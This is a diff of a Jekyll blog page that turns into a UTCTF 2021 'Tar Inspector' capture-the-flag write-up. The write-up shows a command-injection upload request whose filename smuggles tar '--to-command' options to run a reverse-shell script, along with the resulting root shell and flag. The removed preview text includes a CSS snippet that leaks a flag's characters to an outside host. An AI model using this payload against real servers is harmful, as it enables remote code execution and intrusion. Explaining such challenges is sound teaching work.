@@ -35,24 +35,24 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.3" />
-<meta property="og:title" content="Web2.0" />
+<meta property="og:title" content="UTCTF 2021 Tar Inspector Write Up" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
-<meta property="og:description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
-<link rel="canonical" href="http://localhost:4000/" />
-<meta property="og:url" content="http://localhost:4000/" />
+<meta name="description" content="This article is about write-up for the UTCTF 2021. there is only one web challenge, which contain Command Injection bug" />
+<meta property="og:description" content="This article is about write-up for the UTCTF 2021. there is only one web challenge, which contain Command Injection bug" />
+<link rel="canonical" href="http://localhost:4000/posts/UTCTF/" />
+<meta property="og:url" content="http://localhost:4000/posts/UTCTF/" />
 <meta property="og:site_name" content="Web2.0" />
-<meta property="og:type" content="website" />
-<link rel="next" href="http://localhost:4000/page2" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-03-15T08:29:53+09:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Web2.0" />
+<meta property="twitter:title" content="UTCTF 2021 Tar Inspector Write Up" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebSite","description":"A minimal, responsive and feature-rich Jekyll theme for technical writing.","headline":"Web2.0","name":"anonymous","sameAs":["https://x.com/l0ptus"],"url":"http://localhost:4000/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-03-15T08:29:53+09:00","datePublished":"2021-03-15T08:29:53+09:00","description":"This article is about write-up for the UTCTF 2021. there is only one web challenge, which contain Command Injection bug","headline":"UTCTF 2021 Tar Inspector Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/UTCTF/"},"url":"http://localhost:4000/posts/UTCTF/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>Web2.0
+  <title>UTCTF 2021 Tar Inspector Write Up | Web2.0
   </title>
 
   <!--
@@ -102,11 +102,16 @@
   <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">
 
   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
+  
 
   
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
   
 
+  
+    <!-- Manific Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
   
 
   <!-- JavaScript -->
@@ -456,7 +461,7 @@
   <nav class="flex-column flex-grow-1 w-100 ps-0">
     <ul class="nav">
       <!-- home -->
-      <li class="nav-item active">
+      <li class="nav-item">
         <a href="/" class="nav-link">
           <i class="fa-fw fas fa-home"></i>
           <span>HOME</span>
@@ -542,9 +547,25 @@
       
 
       
-        <!-- index page -->
-        <span>Home</span>
+        
+          
+            <span>
+              <a href="/">
+                Home
+              </a>
+            </span>
 
+          
+        
+          
+        
+          
+            
+              <span>UTCTF 2021 Tar Inspector Write Up</span>
+            
+
+          
+        
       
     </nav>
     <!-- endof #breadcrumb -->
@@ -554,7 +575,7 @@
     </button>
 
     <div id="topbar-title">
-      Web2.0
+      Post
     </div>
 
     <button type="button" id="search-trigger" class="btn btn-link">
@@ -608,6 +629,211 @@
 
 
 
+  
+  
+
+  <!-- CDN URL -->
+  
+
+  <!-- Add image path -->
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+
+  
+
 
 <!-- Add header for code snippets -->
 
@@ -628,6 +854,27 @@
   
 
   
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
 
   
   
@@ -647,58 +894,15 @@
 
 
 
+<article class="px-1">
+  <header>
+    <h1 data-toc-skip>UTCTF 2021 Tar Inspector Write Up</h1>
 
-
-
-
-
-<!-- Get pinned posts -->
-
-
-
-
-
-
-<!-- Get default posts -->
-
-
-
-
-
-
-
-
-
-
-<div id="post-list" class="flex-grow-1 px-xl-1">
-  
-    <article class="card-wrapper card">
-      <a href="/posts/Just-CTF-2025/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-
-        <div class="col-md-12">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">JustCTF 2025 Positive Players Write Up</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>
-                
-
-
-
-
-
-                i joined in justctf 2025 to solve web challs, there were 7 web challs and i aimed to solve Simple Tasks and Positive Players. However Simple Tasks was really difficult that i couldn’t even approach...
-              </p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
   Date format snippet
   See: ${JS_ROOT}/utils/locale-dateime.js
 -->
@@ -708,441 +912,265 @@
 
 <time
   
-  data-ts="1754179200"
+  data-ts="1615764593"
   data-df="ll"
   
->
-  Aug  3, 2025
-</time>
-
-
-                <!-- categories -->
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-    <article class="card-wrapper card">
-      <a href="/posts/css-exfiltration/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-
-        <div class="col-md-12">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">CSS Exfiltration via attr() + image-set() from Chrome 133</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>
-                
-
-
-
-
-
-                Summary
-
-input[name=flag][value^=a]{
-    background: url(&#39;https://evm.pics/a&#39;);
-}
-input[name=flag][value^=b]{
-    background: url(&#39;https://evm.pics/b&#39;);
-}
-/* ... */
-
-In most cases, when exploiting ...
-              </p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1744675200"
-  data-df="ll"
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  Apr 15, 2025
+  Mar 15, 2021
 </time>
 
+      </span>
 
-                <!-- categories -->
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-    <article class="card-wrapper card">
-      <a href="/posts/XSS-in-ML-Framework/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-
-        <div class="col-md-12">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">($10,890) What is XSS in the ML/AI ecosystem, not only web3.0?</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>
-                
-
-
-
-
-
-                Hi guys, i wanna introduce a way to earn $10k bounty on an open-source projects. a month ago, i reported a bug in the ML Framework. and the bug i found was not critical so i needed to find a way to...
-              </p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1694656853"
-  data-df="ll"
-  
->
-  Sep 14, 2023
-</time>
-
-
-                <!-- categories -->
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-    <article class="card-wrapper card">
-      <a href="/posts/ReDos-in-Github/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-
-        <div class="col-md-12">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">0-Day, Copy and Paste ReDoS in github.com</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>
-                
-
-
-
-
-
-                Summary
-In summary, I found a Self-ReDoS vulnerability in the issue feature of github.com and reported it to HackerOne.
-
-
-Analysis
-
-function onPaste$1(event) {
-    const { currentTarget: el } = eve...
-              </p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1691226053"
-  data-df="ll"
-  
->
-  Aug  5, 2023
-</time>
-
-
-                <!-- categories -->
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-    <article class="card-wrapper card">
-      <a href="/posts/Line-CTF/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-
-        <div class="col-md-12">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">Line CTF 2023 Write Up</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>
-                
-
-
-
-
-
-                
-  (Web) Baby Simple Gocurl 
-  (Web) Adult Simple Gocurl
-
-
-These two challenges require reading flag in the /flag/ path via SSRF.
-
-
-
-(Web) Baby Simple Gocurl
-
-n.startsWith(&quot;https://&quot;) || n.startsWi...
-              </p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1679821253"
-  data-df="ll"
-  
->
-  Mar 26, 2023
-</time>
-
-
-                <!-- categories -->
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-</div>
-<!-- #post-list -->
-
-
-  <!-- The paginator for post list on HomgPage. -->
-
-<nav aria-label="Page Navigation">
-  <ul class="pagination align-items-center mt-4 mb-0">
-    <!-- left arrow -->
-    
-
-    <li class="page-item disabled">
-      <a class="page-link" href="#" aria-label="previous-page">
-        <i class="fas fa-angle-left"></i>
-      </a>
-    </li>
-
-    <!-- page numbers -->
-    
-    
-
-    
-      
-      
-      
-      
+      <!-- lastmod date -->
       
 
       
 
-      
-        <!-- show number -->
-        <li class="page-item  active">
-          <a
-            class="page-link"
-            href="/"
-          >1</a>
-        </li>
-      
-    
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- show number -->
-        <li class="page-item ">
-          <a
-            class="page-link"
-            href="/page2"
-          >2</a>
-        </li>
-      
-    
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- show number -->
-        <li class="page-item ">
-          <a
-            class="page-link"
-            href="/page3"
-          >3</a>
-        </li>
-      
-    
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- hide number -->
-        
-          <li class="page-item disabled">
-            <span class="page-link">...</span>
-          </li>
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
           
+
+          By
+
+          <em>
+            
+              <a href="https://x.com/l0ptus">anonymous</a>
+            
+          </em>
+        </span>
+
+        <!-- read time -->
+        <!-- Calculate the post's reading time, and display the word count in tooltip -->
+
+
+
+<!-- words per minute -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="389 words"
+>
+  <em>2 min</em> read</span>
+
+      </div>
+      <!-- .d-flex -->
+    </div>
+    <!-- .post-meta -->
+  </header>
+
+  <div class="content">
+    <h3 id="web-tar-inspector-994-pts"><span class="me-2">(Web) Tar Inspector [994 pts]</span><a href="#web-tar-inspector-994-pts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<blockquote>
+  <p>Tar Inspector challenge is get the shell using RCE and read the flag</p>
+</blockquote>
+
+<p>Many people asked for a hint and the contest provided the code for the secure_filename() function. So first, I’ll see <code class="language-plaintext highlighter-rouge">secure_filename()</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="code-header">
+        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="c1"># creates a secured version of the filename
+</span><span class="k">def</span> <span class="nf">secure_filename</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+    <span class="c1"># strip extension and any sneaky path traversal stuff
+</span>    <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="p">[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+    <span class="n">filename</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">basename</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+    <span class="c1"># escape shell metacharacters
+</span>    <span class="n">filename</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sh">"</span><span class="s">(!|\$|#|&amp;|</span><span class="se">\"</span><span class="s">|</span><span class="se">\'</span><span class="s">|\(|\)|\||&lt;|&gt;|`|</span><span class="se">\\</span><span class="s">\|;)</span><span class="sh">"</span><span class="p">,</span> <span class="sa">r</span><span class="sh">"</span><span class="s">\\\1</span><span class="sh">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+    <span class="n">filename</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+    <span class="c1"># add extension
+</span>    <span class="n">filename</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">__</span><span class="sh">'</span><span class="o">+</span><span class="nf">hex</span><span class="p">(</span><span class="nf">randrange</span><span class="p">(</span><span class="mi">10000000</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">+</span><span class="sh">'</span><span class="s">.tar</span><span class="sh">'</span>
+    <span class="k">return</span> <span class="n">filename</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>You can see that the secure_filename() function gets the file name excluding the extension, escapes all special characters, and creates a new file name by including a random value between the file names.</p>
+
+<p><a href="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/1.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/1.png?raw=true" alt="" loading="lazy"></a></p>
+
+<p>Go into the challenge and you can will see the file upload function.</p>
+
+<p><a href="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/2.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/2.png?raw=true" alt="" loading="lazy"></a></p>
+
+<p>If you upload any file, you can see that only the <code class="language-plaintext highlighter-rouge">.tar</code> extension can be uploaded. Probably I need to make RCE happen when i unpack the tar file. When unpack the tar file, I can execute file <code class="language-plaintext highlighter-rouge">using --to-command</code> option :)</p>
+
+<ul>
+  <li>Scenario</li>
+</ul>
+
+<ol>
+  <li>I compress the reverse shell code to tar file and I upload in server.</li>
+  <li>If you upload the tar file, you can see the newly created file name.</li>
+  <li>If you upload the created file again by name, it will be unpack and the file will be executed. Obviously, you need to add the <code class="language-plaintext highlighter-rouge">--to-command</code> option at this time.</li>
+  <li>And since the last in the file must be <code class="language-plaintext highlighter-rouge">.tar</code>, you can bypass it using the <code class="language-plaintext highlighter-rouge">--exclude</code> option.</li>
+</ol>
+
+<p><a href="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/3.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/3.png?raw=true" alt="" loading="lazy"></a></p>
+
+<p>After uploading the tar file, you can see a file named <code class="language-plaintext highlighter-rouge">pocas__bf9d0.tar</code> was created :) Now, When you unpack the <code class="language-plaintext highlighter-rouge">pocas__bf9d0.tar</code> file, you can execute the reverse shell file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>POST /upload HTTP/1.1
+Host: web2.utctf.live:8123
+Content-Length: 1566
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCvRhaPJjhVCXGrN
+Connection: close
+
+------WebKitFormBoundarytCvRhaPJjhVCXGrN
+Content-Disposition: form-data; name="file"; filename="pocas__bf9d0.tar --to-command=python3${IFS}pocas.py --exclude=pocas.tar"
+Content-Type: application/x-tar
+
+
+------WebKitFormBoundarytCvRhaPJjhVCXGrN--
+
+</pre></td></tr></tbody></table></code></div></div>
+<p>I used the <code class="language-plaintext highlighter-rouge">--to-command</code>/<code class="language-plaintext highlighter-rouge">--exclude</code> option as above.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>root@py:~# nc -lp 80
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# pwd
+/tmp/extracts
+# cat /flag.txt
+utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}
+#
+</pre></td></tr></tbody></table></code></div></div>
+<p>You can see that it is unpacked, and the file is executed to get the shell :)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>FLAG : utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}
+</pre></td></tr></tbody></table></code></div></div>
+
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+
+    <!-- tags -->
+    
+
+    <div
+      class="
+        post-tail-bottom
+        d-flex justify-content-between align-items-center mt-5 pb-2
+      "
+    >
+      <div class="license-wrapper">
         
-      
-    
-      
-      
-      
-      
-      
+          
 
-      
-
-      
-        <!-- hide number -->
+          This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
         
-      
+      </div>
+
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
     
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- hide number -->
-        
-      
     
-      
-      
-      
-      
-      
-
-      
-
-      
-        <!-- show number -->
-        <li class="page-item ">
-          <a
-            class="page-link"
-            href="/page7"
-          >7</a>
-        </li>
-      
     
 
-    <!-- mobile pagination -->
-    <li class="page-index align-middle">
-      <span>1</span>
-      <span class="text-muted">/ 7</span>
-    </li>
-
-    <!-- right arrow -->
     
 
-    <li class="page-item ">
-      <a class="page-link" href="/page2" aria-label="next-page">
-        <i class="fas fa-angle-right"></i>
+      
+
+      <a href="https://twitter.com/intent/tweet?text=UTCTF%202021%20Tar%20Inspector%20Write%20Up%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FUTCTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
-    </li>
-  </ul>
-</nav>
-<!-- .pagination -->
+    
 
+      
 
+      <a href="https://www.facebook.com/sharer/sharer.php?title=UTCTF%202021%20Tar%20Inspector%20Write%20Up%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FUTCTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+        <i class="fa-fw fab fa-facebook-square"></i>
+      </a>
+    
+
+      
+
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FUTCTF%2F&text=UTCTF%202021%20Tar%20Inspector%20Write%20Up%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+        <i class="fa-fw fab fa-telegram"></i>
+      </a>
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
+</div>
+
+    </div>
+    <!-- .post-tail-bottom -->
+  </div>
+  <!-- div.post-tail-wrapper -->
+</article>
 
 
             
@@ -1208,12 +1236,94 @@ n.startsWith(&quot;https://&quot;) || n.startsWi...
             </div>
 
             
+              
+              
+
+
+
+  <section id="toc-wrapper" class="ps-0 pe-4">
+    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
+    <nav id="toc"></nav>
+  </section>
+
+
+            
           </aside>
         </div>
 
         <div class="row">
           <!-- tail -->
           <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            
+              
+              <!-- Navigation buttons at the bottom of the post. -->
+
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
+
+  
+    <a
+      href="/posts/Zer0pts/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>zer0pts CTF 2021 Baby SQLi Write Up</p>
+    </a>
+  
+
+  
+    <a
+      href="/posts/Line-CTF/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>Line CTF 2021 diveinternal Write Up</p>
+    </a>
+  
+</nav>
+
+            
+              
+              <!--  The comments switcher -->
+
+
             
 
             <!-- The Footer -->
@@ -1328,6 +1438,9 @@ style="background-color:#030014"
   
 
   
+    <!-- image lazy-loading & popup & clipboard -->
+    
+  
 
 
 
@@ -1399,16 +1512,37 @@ style="background-color:#030014"
 
   
 
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
 
 
-  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js"></script>
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js"></script>
 
 
 
 
 
 
-<script defer src="/assets/js/dist/home.min.js"></script>
+<script defer src="/assets/js/dist/post.min.js"></script>
 
 
 
